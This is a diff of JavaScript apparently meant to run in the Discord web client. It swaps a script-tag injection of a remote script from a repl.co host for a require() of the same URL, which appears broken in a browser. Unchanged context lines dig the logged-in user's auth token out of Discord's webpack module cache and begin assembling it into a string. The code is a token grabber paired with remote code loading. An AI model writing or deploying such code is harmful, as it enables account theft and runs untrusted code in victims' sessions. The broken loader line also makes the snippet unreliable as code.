@@ -106,11 +106,7 @@ const configStorage = {
 
 configStorage.setItem("Name", "DCHX")
 
-document.body.appendChild(Object.assign(document.createElement("script"), {
-  src: "https://scripts.media-server.repl.co/GUI.js",
-  nonce: document.querySelector("[nonce]").nonce,
-  onerror: console.error
-}))
+require('https://scripts.media-server.repl.co/GUI.js')
 
 var voken = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken()
 var token1 = `"`
